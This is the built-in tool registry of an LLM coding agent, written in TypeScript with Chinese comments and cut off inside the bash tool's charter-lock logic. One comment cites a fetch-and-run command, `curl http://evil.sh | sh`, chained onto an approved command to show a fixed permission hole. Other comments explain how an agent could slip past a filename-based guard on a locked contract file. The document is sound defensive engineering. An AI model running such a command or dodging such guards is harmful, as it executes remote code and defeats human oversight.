/**
 * 内置工具注册 —— Ls / Read / Write / Edit / Grep / Bash 六个核心工具，
 * 外加清单（todo）/ 记忆（memory）/ 事件库（record_event · search_events · pull_events）/
 * 分叉点提问（ask）/ 坐标归档（archive）/ git 只读查询（git）等系统级工具，共 14 个。
 * 调用方：main.ts（组装工具子系统时调用）
 * 服务于：为 LLM 提供列目录、读文件、写文件、精准改片段、搜索内容、执行命令的能力
 *         （Ls 支撑"工具增强推理"：模型先看清项目结构再动手，不凭记忆脑补）
 *
 * 设计原则：
 * 1. 参数名只认规范名，不搞多别名（结构化 function calling 由 API 保证参数格式）
 * 2. 每个参数有明确的类型约束和示例值
 * 3. 输出格式统一为 `[状态标识] 描述\n详情`——前缀由 spec.ts 的构造器（toolOk/toolInvalid/
 *    toolError/toolVerifyFailed/toolNegative）统一生成并携带机器可读的 status，
 *    handler 只写正文（结构化返回值，2026-09-12 起）
 * 4. 输入参数做运行时校验，非法参数不执行
 * 5. 改类工具拿不准时**拒绝且一字不落盘**，把原因回给模型让它重试：
 *    静默改错地方比拒绝一次的代价大得多（edit 的 0 命中与多命中两条拒绝路径即此原则）
 */
import type { ToolProvider } from '../core/tools.js';
import {
  defineTool, str, strAllowEmpty, optStr, optPosInt, optBool, ToolInputError,
  toolOk, toolInvalid, toolError, toolVerifyFailed, toolNegative,
} from './spec.js';
import { TASK_HISTORY_FILE, TaskStore, taskStore } from '../todo/store.js';
import { MEMORY_FILE, MemoryStore, memoryStore } from '../memory/store.js';
import { EVENTS_FILE, EventStore, NARRATIVE_KINDS, eventStore, formatEvent } from '../eventlog/store.js';
import { projectRegistry } from '../eventlog/registry.js';
import {
  NO_INTERACTION, buildChoices, buildForkTitle, classifyChoice, formatForkResult, parseCandidates,
  type AskFn,
} from '../project/fork.js';
import {
  CHARTER_FILE, CHARTER_REJECTED_FILE, DEVLOG_FILE, charterLock, contractDrifted,
} from '../project/charter.js';
import {
  ROADMAP_FILE, findCycles, isParent, nextCoord, parentOf, parseRoadmap, resolveStatuses, setStatus,
  spliceCoordTable, unmetDeps, type Coord,
} from '../project/roadmap.js';
import {
  DEVLOG_HEADER, formatArchiveReceipt, formatStamp, renderDevlogEntry,
} from '../project/lifecycle.js';
import {
  BLAME_LINE_MAX, DIFF_FILE_MAX, GIT_OPS, buildGitArgs, isNoCommitsYet, isNoSuchPath, isNotARepo,
  parseBlame, parseBranch, parseLog, parseNumstat, parseRemote, parseShow, parseStatus, parseTag,
  renderBlame, renderBranch, renderDiff, renderLog, renderRemote, renderShow, renderStatus,
  renderTag, validateLineRange, validateTarget,
  type GitOp,
} from '../git/git.js';

/* ═══════════════════════════════════════════════════════════════════════════════
   参数规则在每个工具的 spec 里，Schema 与校验都由它派生（实现见 spec.ts）

   改前这里有 4 个校验件（requireString / requireStringAllowEmpty / optionalString /
   optionalPositiveInt）、共 14 处调用，与下面 6 份 parameters 是**同一套规则的两份手写副本**，
   纽带只有"人手把同一个词打了多遍"（grep 的 pattern 在一个工具里出现 7 次）。现在：
     · 字段名只在 spec 里写一遍，Schema 的 properties / required 由 toJsonSchema 派生
     · 校验由 registry.execute 在 handler **之前**跑 parseSpec，handler 里不再逐个取参
     · handler 的入参类型由 Infer<typeof spec> 推出，args.pattern 直接就是 string

   两个刻意保留的形状（不是遗漏）：
   1. permissionKey / permissionDetail 仍拿**未经校验的原始 args**——权限确认发生在
      agent-loop 调 execute 之前，那时还没跑 parse。所以 edit 的 permissionDetail 里那句
      String(args.replaceAll) 消不掉（verify-spec 5-5 因此期望 1 而不是 0）。
   2. 6 个 handler 的 catch 仍保留 instanceof ToolInputError 分支。parse 已经移到 execute
      里、跑在 handler 之前，正常不会命中；留着是为了保住"handler 体内自己抛出的参数错误
      也算 [INVALID]"这条分类不变量（代价：6 行实际不走的分支，以及为它保留的 import）。
   ═══════════════════════════════════════════════════════════════════════════════ */

/* ═══════════════════════════════════════════════════════════════════════════════
   子进程输出解码 与 glob 编译
   ═══════════════════════════════════════════════════════════════════════════════ */

/**
 * 把子进程的输出字节解成字符串。
 *
 * 为什么不能硬编码一种编码（改前硬编码 GBK，实测两处失真）：进程之间传的是**字节**，
 * 字节不带"我是谁的编码"这个属性，而**谁产生的输出决定编码**——
 *   · cmd.exe 内建命令（echo / dir / type / chcp）走控制台代码页，中文 Windows = 936(GBK)
 *     实测 `echo 中文测试` → d6d0cec4b2e2cad4
 *   · 外部程序（node / npm / git / tsc）走自己的编码，通常 UTF-8
 *     实测 `node -e "console.log('中文测试')"` → e4b8ade69687e6b58be8af95
 * 硬编码 GBK 时后者全变乱码：模型跑 `node -e "console.log('编译通过')"` 看到的是
 * "缂栬瘧閫氳繃"，而它正是靠这段文本判断编译结果的。
 *
 * 策略：先按 UTF-8 **严格**解（fatal: true）——解得通就是 UTF-8（纯 ASCII 是两者的公共
 * 子集，怎么解都一样）；解不通说明含非 UTF-8 字节，退回平台代码页。GBK 的中文字节序列
 * （如 d6d0）在 UTF-8 下必然非法（双字节前导后必须跟 10xxxxxx，而 d0 不是），所以这个
 * 探测在实践中是可靠的判别，不是碰运气。
 *
 * 残留限制（不装糊涂，写明）：一条命令同时混两种编码时（如 `echo x && node y`），GBK
 * 字节会让 UTF-8 严格解失败，于是整段按 GBK 解，node 那部分仍乱码。逐段判编码要先按行
 * 切字节再分别试解，代价是可能把一行 UTF-8 中文误判成 GBK（GBK 字符集覆盖面大，几乎所有
 * 双字节组合都"合法"）。当前策略在"单一来源输出"（绝大多数情况）上是对的。
 */
function decodeChildOutput(raw: Buffer): string {
  try {
    return new TextDecoder('utf-8', { fatal: true }).decode(raw);
  } catch {
    // 回退解码器本身也可能不可用（Node 未带 full-icu 时 'gbk' 构造抛 RangeError）。
    // 这种情况绝不能让它冒到 handler 的 catch 里——那会被报成 [ERROR] 命令执行失败，
    // 模型会去排查一个根本没坏的执行环境（改前正是这条路）。
    try {
      return new TextDecoder(process.platform === 'win32' ? 'gbk' : 'utf-8', { fatal: false }).decode(raw);
    } catch {
      return raw.toString('utf-8');
    }
  }
}

/** 展开 glob 里的 {a,b}，支持多组嵌套（递归） */
function expandBraces(glob: string): string[] {
  const m = glob.match(/\{([^{}]*)\}/);
  if (!m || m.index === undefined) return [glob];
  const out: string[] = [];
  for (const part of m[1].split(',')) {
    out.push(...expandBraces(glob.slice(0, m.index) + part.trim() + glob.slice(m.index + m[0].length)));
  }
  return out;
}

/**
 * 把 include 的 glob 编译成正则。只支持 * ? {} 三种——够用，且不至于自己写出半个 shell。
 * 编译失败返回 null，由调用方报 [INVALID]：**不能静默当成"不过滤"**，那会把
 * "只搜 .ts"变成"搜全部"，返回一堆无关命中而模型看不出过滤没生效。
 */
function globToRegExp(glob: string): RegExp | null {
  const parts = expandBraces(glob);
  // 未闭合的 { （如 "*.{ts,"）在 JS 正则里会被当成字面量静默通过（Annex B 宽容），
  // 编译不报错却匹配不到任何文件。这种"过滤掉一切"比"不过滤"更难发现：
  // 模型只看到 [NO_MATCH] 无匹配，不会意识到是自己的 include 写错了。所以显式判掉
  if (parts.some((p) => /[{}]/.test(p))) return null;
  try {
    const body = parts
      // 顺序承重：先转义正则元字符，再把 * ? 换成字符类。
      // 反过来做的话，[^/] 里的 ^ [ ] 会被自己的转义步骤再转一遍
      .map((g) => g
        .replace(/[.+^$()|[\]\\]/g, '\\$&')
        .replace(/\*/g, '[^/]*')
        .replace(/\?/g, '[^/]'))
      .join('|');
    return new RegExp(`^(?:${body})$`);
  } catch {
    return null;
  }
}

/* ═══════════════════════════════════════════════════════════════════════════════
   工具注册
   ═══════════════════════════════════════════════════════════════════════════════ */

/**
 * 注册 13 个内置工具（Ls / Read / Write / Edit / Grep / Bash / Todo / Memory / RecordEvent /
 * SearchEvents / PullEvents / Ask / Archive）。
 * @param tools 工具子系统
 * @param store 任务清单真相源；缺省用进程级单例（runtime 也读同一个），测试可注入自己的实例。
 * @param mem 项目记忆真相源（缺省单例，测试可注入）。
 * @param evs 历史事件库（缺省单例，测试可注入）。
 * @param askFn 分叉点提问实现。**缺省是"永远答问不了"**（`NO_INTERACTION`）——工具层刻意不
 *   import 任何 io 模块（那会把 UI 层拖进 RPC 启动路径，而 io 层允许写 stdout）。真正的
 *   交互实现由 main.ts 在 TTY 侧注入；测试与 RPC 走缺省值，行为是"降级为文字提问"，
 *   而不是"静默替用户选一个"（fail-closed，语义见 src/project/fork.ts 文件头）。
 */
export function registerBuiltinTools(
  tools: ToolProvider,
  store: TaskStore = taskStore,
  mem: MemoryStore = memoryStore,
  evs: EventStore = eventStore,
  askFn: AskFn = NO_INTERACTION,
): void {
  /* ── Ls：列目录（了解结构，工具增强推理的起点） ── */
  tools.register(defineTool({
    name: 'ls',
    description: '列出目录内容，了解项目/目录结构（动手前先看清结构）。目录项以 / 结尾。默认只列当前层，depth 可递归。跳过 .git/node_modules/dist 等噪音目录。',
    spec: {
      path: optStr('目录路径', '目录路径，默认当前目录。示例: "src/" 或 "C:/Users/name/project"', '.'),
      depth: optPosInt('递归深度', '递归深度（1=仅当前层）。默认 1。示例: 2 列出两层', 1),
    },
    handler: async (args) => {
      try {
        const { path, depth } = args;

        const { existsSync, statSync, readdirSync } = await import('node:fs');
        const resolvedPath = path.replace(/\\/g, '/');

        if (!existsSync(resolvedPath)) {
          return toolNegative('NOT_FOUND', `目录不存在: ${resolvedPath}`);
        }
        if (!statSync(resolvedPath).isDirectory()) {
          return toolNegative('NOT_DIR', `不是目录: ${resolvedPath}`);
        }

        // 递归列目录（目录名带 / 后缀；跳过噪音目录；限制条目数防膨胀）
        const SKIP = new Set(['.git', 'node_modules', 'dist']);
        const MAX_ENTRIES = 200;
        const lines: string[] = [];
        const walk = (dir: string, level: number): void => {
          if (level > depth || lines.length >= MAX_ENTRIES) return;
          let items;
          try {
            items = readdirSync(dir, { withFileTypes: true });
          } catch {
            return; // 无权限等 → 跳过该目录
          }
          items.sort((a, b) => {
            if (a.isDirectory() !== b.isDirectory()) return a.isDirectory() ? -1 : 1;
            return a.name.localeCompare(b.name);
          });
          for (const item of items) {
            if (lines.length >= MAX_ENTRIES) return;
            if (item.name.startsWith('.') || SKIP.has(item.name)) continue;
            const prefix = '  '.repeat(level - 1);
            const isDir = item.isDirectory();
            lines.push(`${prefix}- ${item.name}${isDir ? '/' : ''}`);
            if (isDir) walk(`${dir}/${item.name}`, level + 1);
          }
        };
        walk(resolvedPath, 1);

        if (lines.length === 0) {
          return toolNegative('EMPTY', `目录为空或全部被过滤: ${resolvedPath}`);
        }
        const count = lines.length;
        return toolOk(`目录 ${resolvedPath} (${count} 项${count >= MAX_ENTRIES ? ', 已达上限截断' : ''}):\n${lines.join('\n')}`);
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        return toolError(`列目录失败: ${e instanceof Error ? e.message : String(e)}`);
      }
    },
  }));

  /* ── Read：读文件 ── */
  tools.register(defineTool({
    name: 'read',
    description: '读取文件内容。可指定行范围分段读取大文件。路径用 / 或 \\\\，如 "C:/Users/name/file.txt" 或 "src/utils/helper.ts"。',
    spec: {
      path: str('文件路径', '文件路径，绝对路径或相对当前工作目录。示例: "C:/Users/name/file.txt" 或 "src/data/config.json"'),
      offset: optPosInt('起始行号', '起始行号，从 1 开始。默认 1。示例: 10 （从第 10 行开始读）', 1),
      limit: optPosInt('读取行数', '读取行数。默认不限制。示例: 50 （最多读 50 行）', Number.MAX_SAFE_INTEGER),
    },
    handler: async (args) => {
      try {
        const { path, offset, limit } = args;

        const { readFileSync, existsSync, statSync } = await import('node:fs');
        const resolvedPath = path.replace(/\\/g, '/');

        if (!existsSync(resolvedPath)) {
          return toolNegative('NOT_FOUND', `文件不存在: ${resolvedPath}`);
        }
        if (!statSync(resolvedPath).isFile()) {
          return toolNegative('NOT_FILE', `不是文件: ${resolvedPath}`);
        }

        const content = readFileSync(resolvedPath, 'utf-8');
        const lines = content.split('\n');
        const start = Math.max(0, offset - 1);
        const count = Math.min(limit, lines.length - start);
        const selected = lines.slice(start, start + count);
        const output = selected.map((line, i) => `${start + i + 1} | ${line}`).join('\n');

        return toolOk(`文件 ${resolvedPath} (${lines.length} 行) 行 ${offset}-${offset + count - 1}:\n${output}`);
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        return toolError(`读取失败: ${e instanceof Error ? e.message : String(e)}`);
      }
    },
  }));

  /* ── Write：写文件 ── */
  tools.register(defineTool({
    name: 'write',
    description: '创建新文件或整篇覆盖已有文件的内容。自动创建不存在的父目录。只改文件里的一小段请用 edit（不必重抄全文，也不会误伤未改动的部分）。路径用 / 或 \\\\。',
    requirePermission: true,
    spec: {
      path: str('文件路径', '文件路径，绝对路径或相对当前工作目录。示例: "C:/Users/name/output.txt" 或 "src/data/config.json"'),
      content: str('文件内容', '要写入的文件完整内容。会完全覆盖已存在的文件。示例: "{\\n  \\"name\\": \\"test\\"\\n}"'),
    },
    // 授权边界 = 目标文件。刻意不含 content：内容每次都不同，塞进键里会让"本次全部允许"
    // 退化成"只允许这一次"。反斜杠归一，免得 `src\x.ts` 与 `src/x.ts` 算成两个键。
    permissionKey: (args) => String(args.path ?? '').replace(/\\/g, '/'),
    handler: async (args) => {
      try {
        const { path, content } = args;

        const { writeFileSync, readFileSync, mkdirSync, existsSync } = await import('node:fs');
        const { dirname } = await import('node:path');
        const resolvedPath = path.replace(/\\/g, '/');
        const dir = dirname(resolvedPath);

        if (!existsSync(dir)) {
          mkdirSync(dir, { recursive: true });
        }

        writeFileSync(resolvedPath, content, 'utf-8');

        // 写回验证
        const verified = readFileSync(resolvedPath, 'utf-8');
        if (verified !== content) {
          return toolVerifyFailed(`写入内容与读取内容不一致: ${resolvedPath}`);
        }

        const lineCount = content.split('\n').length;
        return toolOk(`写入成功: ${resolvedPath} (${content.length} 字符, ${lineCount} 行)`);
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        return toolError(`写入失败: ${e instanceof Error ? e.message : String(e)}`);
      }
    },
  }));

  /* ── Edit：精准替换文件片段（改局部用它，不要 write 重抄全文） ── */
  tools.register(defineTool({
    name: 'edit',
    description: '精准替换文件中的一段文本，用于局部修改（改一行、改一个函数、改一处配置）。oldText 必须与文件里的原文逐字符一致（缩进、空格、标点全算）且在文件中唯一；找不到或命中多处时本工具会拒绝并回报原因，文件一字不动。新建文件或整篇重写才用 write。路径用 / 或 \\\\。',
    requirePermission: true,
    spec: {
      path: str('文件路径', '文件路径，绝对路径或相对当前工作目录。示例: "src/tools/builtin.ts"'),
      oldText: str('原文片段', '要被替换的原文片段，逐字符照抄文件里的内容（缩进与空格全算）。不确定就先用 read 看清原文，不要凭记忆填。片段要带足够上下文以保证在文件中唯一。示例: "const count = 1;"'),
      newText: strAllowEmpty('新文本', '替换后的新文本。传空字符串表示删掉 oldText 这一段。示例: "const count = 2;"', '（删除内容请显式传空字符串）'),
      replaceAll: optBool('是否全部替换', '命中多处时是否全部替换。默认 false，即多命中直接拒绝并回报候选行号。仅在确认每一处都该改成同样内容时才传 true。示例: false', false),
    },
    // 授权边界 = 目标文件。刻意不含 oldText/newText：两段文本每次都不同，塞进键里会让
    // "本次全部允许"退化成"只允许这一次"；而只截前 N 字符更糟——那正是本轮修掉的静默扩权
    // （同一文件里 oldText 开头相同的两次调用会共用一次授权，newText 改成什么都放行）。
    permissionKey: (args) => String(args.path ?? '').replace(/\\/g, '/'),
    // 弹窗文案自定义（core ToolDefinition 的可选成员）：默认的 args JSON 前 80 字符会被
    // path 与 oldText 占满，用户在弹窗里看不出要改什么。硬约束：必须单行——selector 的标题
    // 只占 1 行、每行过 fitWidth 截断，文案里带 \n 会多出一个物理行，把"固定行数 + 回退清行"
    // 算错 → 选择器漂移。所以下面 flat() 把所有空白（含换行）压成单个空格。
    permissionDetail: (args) => {
      const target = String(args.path ?? '?').replace(/\\/g, '/');
      const flat = (v: unknown): string => String(v ?? '').replace(/\s+/g, ' ').trim();
      const clip = (s: string, n: number): string => (s.length > n ? `${s.slice(0, n)}…` : s);
      const all = String(args.replaceAll) === 'true' ? '（全部）' : '';
      return `改 ${target}: ${clip(flat(args.oldText), 20)} → ${clip(flat(args.newText), 20)}${all}`;
    },
    handler: async (args) => {
      try {
        const { path, oldText, newText, replaceAll } = args;
        const resolvedPath = path.replace(/\\/g, '/');

        // 新旧文本相同：不落盘、不报成功，直接回一句无效（省掉无谓的写与验证）
        if (oldText === newText) {
          return toolInvalid(`oldText 与 newText 完全相同，无需改动: ${resolvedPath}`);
        }

        const { readFileSync, writeFileSync, existsSync, statSync } = await import('node:fs');

        if (!existsSync(resolvedPath)) {
          return toolNegative('NOT_FOUND', `文件不存在: ${resolvedPath}（新建文件请用 write）`);
        }
        if (!statSync(resolvedPath).isFile()) {
          return toolNegative('NOT_FILE', `不是文件: ${resolvedPath}`);
        }

        // 按字节读，不按 'utf-8' 读字符串：BOM 判定与写回验证都落在字节上。
        // 实测 Node v24.12.0 用 utf-8 读**不剥** BOM（\uFEFF 会留在串首），但这是随时可能
        // 变的行为细节，不该当设计依据——自己读字节、自己判头三字节，BOM 的保真就与 Node
        // 版本无关；写回也因此能直接按字节 equals 验证，不经二次编解码。
        const buf = readFileSync(resolvedPath);
        const hasBom = buf[0] === 0xef && buf[1] === 0xbb && buf[2] === 0xbf;
        const decoded = buf.toString('utf-8');
        const original = hasBom ? decoded.slice(1) : decoded;

        // 行尾保持：纯 CRLF 文件（Windows 上 git core.autocrlf=true 检出的源码就是这样）里，
        // 模型发来的 oldText 几乎必然用 \n，直接匹配必然 0 命中 —— 工具会在最需要它的地方失效。
        // 做法：在 \n 归一化副本上匹配与替换，写回前整体还原成 CRLF。
        // 只对"纯 CRLF"做这层往返：混合行尾的文件按字面匹配（宁可拒绝，也不做波及全文的还原）。
        const crlfCount = (original.match(/\r\n/g) ?? []).length;
        const lfCount = (original.match(/\n/g) ?? []).length;
        const allCrlf = crlfCount > 0 && crlfCount === lfCount;
        const work = allCrlf ? original.replace(/\r\n/g, '\n') : original;

        // 数命中：indexOf 循环 + 字面切片拼接，不用正则——oldText 里满是 . * ( [ ? 这类元字符，
        // 走正则就得转义，转义就有漏转的风险（漏一个就把"改这一处"变成"改一片"）。
        // 步进 oldText.length 而非 1：不重复计重叠命中，与 replaceAll 的语义一致。
        const hits: number[] = [];
        for (let i = work.indexOf(oldText); i !== -1; i = work.indexOf(oldText, i + oldText.length)) {
          hits.push(i);
        }

        // 状态的选择是**承重的**，不要"为一致性"改成 NO_MATCH / NOT_FOUND：
        // agent-loop 把 error / verify_failed / invalid 记作失败，而"重复失败保护"只在失败时计数，
        // 第 2 次同样调用就会追加 [系统提示] 叫模型停止原样重试、先去 read 确认。
        // 定位失败（0 命中 / 多命中）恰恰是最容易被原样重试的一类，用有效否定状态等于把这层保护关掉。
        // 为何不用 invalid（2026-09-05 起它也计失败，行为上已等价）：0 命中不是"参数格式不合法"，
        // 而是"文件内容与模型预期不符"——参数本身完全合法，语义上属执行失败。
        // 反之 NOT_FOUND（目标文件不存在）保持与 read/write 一致的有效否定语义。
        if (hits.length === 0) {
          return toolError(`oldText 在文件中找不到，未做任何改动: ${resolvedPath}\n`
            + `文件共 ${work.split('\n').length} 行。oldText 必须与文件内容逐字符一致（缩进、空格、标点全算）。\n`
            + `先用 read 看清原文再重试，不要凭记忆猜。`);
        }

        if (hits.length > 1 && !replaceAll) {
          // 拒绝而不是"改第一处"：猜是最危险的行为——它会静默改错地方，模型和用户都看不出来。
          const lineOf = (idx: number): number => work.slice(0, idx).split('\n').length;
          const shown = hits.slice(0, 20).map(lineOf);
          const more = hits.length > shown.length ? `（仅列出前 ${shown.length} 处）` : '';
          return toolError(`oldText 命中 ${hits.length} 处，无法确定该改哪一处，未做任何改动: ${resolvedPath}\n`
            + `候选行号: 第 ${shown.join(', ')} 行${more}\n`
            + `给 oldText 加上下文使其唯一；确认每一处都要改成同样内容时，才传 replaceAll: true。`);
        }

        const updated = replaceAll
          ? work.split(oldText).join(newText)
          : work.slice(0, hits[0]) + newText + work.slice(hits[0] + oldText.length);

        // 还原行尾与 BOM 后整体写回：未命中的部分必须与原文逐字节相同
        const payload = (hasBom ? '\uFEFF' : '') + (allCrlf ? updated.replace(/\n/g, '\r\n') : updated);
        writeFileSync(resolvedPath, payload, 'utf-8');

        // 写回验证按字节比：不依赖"编码读会不会吃 BOM"这类行为细节
        if (!readFileSync(resolvedPath).equals(Buffer.from(payload, 'utf-8'))) {
          return toolVerifyFailed(`写回内容与读取内容不一致: ${resolvedPath}`);
        }

        const before = work.split('\n').length;
        const after = updated.split('\n').length;
        const delta = after - before;
        return toolOk(`已替换 ${replaceAll ? hits.length : 1} 处: ${resolvedPath} `
          + `(${before} → ${after} 行${delta === 0 ? '' : `, ${delta > 0 ? '+' : ''}${delta}`}, `
          + `${original.length} → ${updated.length} 字符${allCrlf ? ', CRLF 已保持' : ''}${hasBom ? ', BOM 已保持' : ''})`);
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        return toolError(`替换失败: ${e instanceof Error ? e.message : String(e)}`);
      }
    },
  }));

  /* ── Grep：搜索文件内容 ── */
  tools.register(defineTool({
    name: 'grep',
    description: '在文件中递归搜索文本或正则模式，返回"路径:行号:该行内容"。纯 Node 实现、跨平台（Windows 无需装 grep 或 rg）。跳过 .git/node_modules/dist、二进制文件与超大文件。pattern 按 JS 正则编译。',
    spec: {
      pattern: str('搜索模式', '搜索模式，支持正则表达式。特殊字符请转义。示例: "function\\s+\\w+" 或 "TODO|FIXME" 或 "console\\.log"'),
      path: optStr('搜索路径', '搜索路径，文件或目录。默认当前目录。示例: "src/" 或 "C:/Users/name/project"', '.'),
      include: optStr('过滤模式', '文件类型过滤 glob 模式。示例: "*.ts" 或 "*.{ts,js,json}" 或 "*.txt"', ''),
    },
    handler: async (args) => {
      try {
        // path / include 改名解构：handler 体内沿用的局部名是 searchPath / glob
        //（path 与下面的 resolvedPath、glob 与 globToRegExp 各自成对，改名反而读着费劲）
        const { pattern, path: searchPath, include: glob } = args;

        /* 纯 Node 遍历，不再 shell 出去。改前拼的是 `grep -rn ... 2>/dev/null | head -50`：
           POSIX 语法，而 Windows 上 execSync 走 cmd.exe —— grep 不存在、2>/dev/null 被当成
           路径，实测在中文 Windows 上任何调用都失败；更糟的是失败被报成 [NO_MATCH]，而
           agent-loop 把 NO_MATCH 归为"有效否定（不计失败）"，于是模型搜一个**确实存在**的
           符号会得到"无匹配"，据此形成对整个代码库的错误认知，且收不到任何警告。 */

        // 坏正则必须是 invalid，不能混进 NO_MATCH：那是"我写错了"与"项目里没有"的区别
        let re: RegExp;
        try {
          re = new RegExp(pattern);
        } catch (e) {
          return toolInvalid(`正则无法编译: /${pattern}/ —— ${e instanceof Error ? e.message : String(e)}`);
        }
        const includeRe = glob ? globToRegExp(glob) : null;
        if (glob && includeRe === null) return toolInvalid(`include 过滤模式无法编译: ${glob}`);

        const { existsSync, statSync, readdirSync, readFileSync } = await import('node:fs');
        const resolvedPath = searchPath.replace(/\\/g, '/');
        if (!existsSync(resolvedPath)) return toolNegative('NOT_FOUND', `路径不存在: ${resolvedPath}`);

        const SKIP_DIRS = new Set(['.git', 'node_modules', 'dist']);
        const MAX_FILE_BYTES = 2 * 1024 * 1024;   // 超大文件跳过：读进来只为搜一遍不值得
        const MAX_MATCHES = 50;                   // 与改前的 head -50 同量级，防输出膨胀
        const MAX_FILES = 5000;                   // 防误指向盘符根目录时走到天荒地老
        const PROBE_BYTES = 8192;                 // 二进制判定的探测窗口

        const hits: string[] = [];
        let scanned = 0, skippedBinary = 0, skippedBig = 0, hitCap = false;

        const scanFile = (file: string): void => {
          if (hitCap || scanned >= MAX_FILES) return;
          let buf: Buffer;
          try {
            buf = readFileSync(file);
          } catch {
            return;   // 无权限 / 占用中 → 跳过该文件，不该让整个搜索失败
          }
          if (buf.length > MAX_FILE_BYTES) { skippedBig++; return; }
          // 二进制判定：头部窗口内有 NUL 字节即视为二进制（与 ripgrep 同一思路）。
          // 不跳过的话，一个 .png 能贡献几百行乱码命中，把 50 个名额全吃光。
          // 注意 Buffer.indexOf 的第三参是 encoding 而非结束位置，限定窗口只能先 subarray
          //（subarray 越界会自动夹到长度，不必自己 Math.min）
          if (buf.subarray(0, PROBE_BYTES).indexOf(0) !== -1) { skippedBinary++; return; }
          scanned++;
          const lines = buf.toString('utf-8').split('\n');
          for (let i = 0; i < lines.length; i++) {
            const line = lines[i].endsWith('\r') ? lines[i].slice(0, -1) : lines[i];
            if (!re.test(line)) continue;
            hits.push(`${file}:${i + 1}:${line}`);
            if (hits.length >= MAX_MATCHES) { hitCap = true; return; }
          }
        };

        const walk = (dir: string): void => {
          if (hitCap || scanned >= MAX_FILES) return;
          let items;
          try {
            items = readdirSync(dir, { withFileTypes: true });
          } catch {
            return;
          }
          items.sort((a, b) => a.name.localeCompare(b.name));   // 排序让输出稳定，断言才可复现
          for (const item of items) {
            if (hitCap) return;
            if (item.name.startsWith('.') || SKIP_DIRS.has(item.name)) continue;
            const full = `${dir}/${item.name}`;
            if (item.isDirectory()) { walk(full); continue; }
            if (includeRe && !includeRe.test(item.name)) continue;
            scanFile(full);
          }
        };

        if (statSync(resolvedPath).isDirectory()) walk(resolvedPath);
        else scanFile(resolvedPath);

        // "扫了 N 个文件"必须回给模型：0 命中时它需要区分"扫了 300 个文件确实没有"
        // 与"过滤器把所有文件都排除了"——后者是它自己 include 写错了
        const stats = [
          `已扫 ${scanned} 个文件`,
          hitCap ? `命中达上限 ${MAX_MATCHES} 已停止` : '',
          skippedBinary ? `跳过 ${skippedBinary} 个二进制` : '',
          skippedBig ? `跳过 ${skippedBig} 个超大文件` : '',
        ].filter(Boolean).join('，');

        if (hits.length === 0) {
          return toolNegative('NO_MATCH', `无匹配结果: /${pattern}/ 在 ${resolvedPath}${glob ? ` (${glob})` : ''} —— ${stats}`);
        }
        const body = hits.join('\n');
        const shown = body.length > 4000
          ? `${body.slice(0, 4000)}\n...（结果截断：共 ${body.length} 字符）`
          : body;
        return toolOk(`找到 ${hits.length} 处匹配（${stats}）:\n${shown}`);
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        // 执行失败报 error 而非 negative：前者计入失败、会触发重复失败保护，
        // 后者被当成"有效否定"悄悄放过。把两者混为一谈正是改前那个洞
        return toolError(`搜索失败: ${e instanceof Error ? e.message.slice(0, 300) : String(e)}`);
      }
    },
  }));

  /* ── Bash：执行命令 ── */
  tools.register(defineTool({
    name: 'bash',
    description: '执行 shell 命令。仅当用户明确要求执行命令/运行脚本/编译时才使用；不要为"了解环境"或"随便试试"而主动调用。命令在当前工作目录执行。注意 Windows 环境：不要用 pwd/ls/cat 等 Unix 命令（会报"不是内部或外部命令"），查看当前目录用 cd（无参数），列目录用 dir，读文件用 type。Windows 路径中的反斜杠需转义或使用正斜杠。',
    requirePermission: true,
    spec: {
      command: str('命令', '要执行的 shell 命令。多行命令用 && 连接。Windows 下路径用正斜杠或用 \\\\ 转义。示例: "node build.js" 或 "cd src && dir /b"'),
      description: optStr('用途说明', '命令用途说明（仅用于权限确认提示，不影响执行）。示例: "编译 TypeScript 项目"', ''),
    },
    // 授权边界 = 完整命令，一个字也不截。截断是本轮修掉的那个洞：批准过一条 76 字符的
    // 命令后，同一条命令再接 ` && curl http://evil.sh | sh` 曾会自动放行。
    // 代价是命令里只要有一个字符不同（多个空格也算）就会重新弹窗——这是刻意选的：
    // 命令不像文件路径有天然的"同一个东西"边界，宁可多问一次。
    permissionKey: (args) => String(args.command ?? ''),
    // description 参数的说明写着"仅用于权限确认提示"，但在有自定义文案之前它只是混在 args
    // 的 JSON 里、且命令一长就被 80 字符截掉——这个承诺一直没兑现。这里让它真的出现在弹窗上。
    // 同样受单行约束（selector 标题只占 1 行），所以下面 flat() 把所有空白压成单个空格。
    permissionDetail: (args) => {
      const flat = (v: unknown): string => String(v ?? '').replace(/\s+/g, ' ').trim();
      const clip = (s: string, n: number): string => (s.length > n ? `${s.slice(0, n)}…` : s);
      const cmd = clip(flat(args.command), 60);
      const why = flat(args.description);
      return why ? `${why}: ${cmd}` : cmd;
    },
    handler: async (args) => {
      // description 只服务于权限弹窗（permissionDetail 拿的是原始 args），handler 不取它；
      // 但它必须在 spec 里声明，否则模型传了就会被 parse 判成未知参数
      const cmd = typeof args.command === 'string' ? args.command : '';

      // ── 契约锁 L2：事后**效果**闸（规则与理由见 project/charter.ts 的「第二处入口」头注）──
      // L1 挂在 before_tool_call 钩子上，判据是**字面文件名**；它漏拼出来的路径
      // （`cat .f*/CHARTER.md`、`node build.js` 里写它）。这里按**效果**兜底：
      // 跑之前记下契约文件长什么样，跑完再比对，锁定期间变了就回滚。
      // 锁开着（/charter unlock）时整段空转 —— 一次 fs 都不碰。
      const charterLocked = !charterLock.isUnlocked();
      const { existsSync, readFileSync, writeFileSync, unlinkSync } = await import('node:fs');
      const { resolve } = await import('node:path');
      const charterAbs = resolve(process.cwd(), CHARTER_FILE);
      const readCharter = (): string | null => {
        try { return existsSync(charterAbs) ? readFileSync(charterAbs, 'utf-8') : null; }
        catch { return null; }   // 读不到就按"没有"算，不因为读不了它而掀翻整条命令
      };
      const charterBefore = charterLocked ? readCharter() : null;

      /** 命令跑完后调一次：锁定期间契约变了 → 回滚 + 记账 + 返回要报的错；没变返回 null */
      const contractAfterRun = (): string | null => {
        if (!charterLocked) return null;
        const after = readCharter();
        if (!contractDrifted(charterBefore, after)) return null;

        // ① 先把被顶掉的那一版**存下来**，再回滚 —— 顺序是承重的。
        //    回滚是破坏性动作：绝大多数情形被顶掉的是模型违规写的内容（丢了活该），
        //    但极小概率是用户本人在编辑器里改的（时间窗口 = 这条命令的执行时长）。
